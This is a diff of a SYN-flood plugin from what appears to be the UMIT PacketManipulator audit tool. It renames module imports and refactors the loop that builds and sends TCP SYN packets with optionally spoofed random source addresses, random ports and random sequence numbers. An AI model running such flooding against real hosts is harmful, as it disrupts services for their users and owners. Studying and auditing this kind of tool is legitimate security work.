@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Copyright (C) 2008 Adriano Monteiro Marques
+# Copyright (C) 2008,2010 Adriano Monteiro Marques
 #
 # Author: Francesco Piccinno <stack.box@gmail.com>
 #
@@ -25,18 +25,18 @@ from time import sleep
 from random import randint
 from threading import Thread
 
-from PM.Core.I18N import _
-from PM.Core.Logger import log
-from PM.Core.Atoms import generate_traceback
-from PM.Core.AuditUtils import is_ip, random_ip, AuditOperation
-from PM.Core.Const import STATUS_ERR, STATUS_WARNING, STATUS_INFO
+from umit.pm.core.i18n import _
+from umit.pm.core.logger import log
+from umit.pm.core.atoms import generate_traceback
+from umit.pm.core.auditutils import is_ip, random_ip, AuditOperation
+from umit.pm.core.const import STATUS_ERR, STATUS_WARNING, STATUS_INFO
 
-from PM.Gui.Core.App import PMApp
-from PM.Gui.Plugins.Core import Core
-from PM.Gui.Plugins.Engine import Plugin
-from PM.Manager.AuditManager import *
+from umit.pm.gui.core.app import PMApp
+from umit.pm.gui.plugins.core import Core
+from umit.pm.gui.plugins.engine import Plugin
+from umit.pm.manager.auditmanager import *
 
-from PM.Backend import MetaPacket
+from umit.pm.backend import MetaPacket
 
 AUDIT_NAME = 'tcp-synflood'
 AUDIT_MSG = '<tt><b>' + AUDIT_NAME + ':</b> %s</tt>'
@@ -170,19 +170,25 @@ class SynFloodOperation(AuditOperation):
             while probes != 0 and self.internal:
                 pkt = MetaPacket.new('ip') / MetaPacket.new('tcp')
 
-                pkt.set_field('ip.dst', self.dip)
-                pkt.set_field('tcp.dport', self.dport)
-                pkt.set_field('tcp.flags', TH_SYN)
-
                 if self.sip is True:
-                    pkt.set_field('ip.src', random_ip())
-                elif sip != '0.0.0.0':
-                    pkt.set_field('ip.src', self.sip)
+                    sip = random_ip()
+                elif self.sip != '0.0.0.0':
+                    sip = self.sip
 
                 if self.sport is True:
-                    pkt.set_field('tcp.sport', randint(1, 65535))
+                    sport = randint(1, 65535)
                 else:
-                    pkt.set_field('tcp.sport', self.sport)
+                    sport = self.sport
+
+                pkt.set_fields('ip', {
+                    'dst' : self.dip,
+                    'src' : sip})
+
+                pkt.set_fields('tcp', {
+                    'sport' : sport,
+                    'dport' : self.dport,
+                    'flags' : TH_SYN,
+                    'seq' : randint(0, 2L**32-1)})
 
                 self.context.si_l3(pkt)
                 sleep(self.delay)
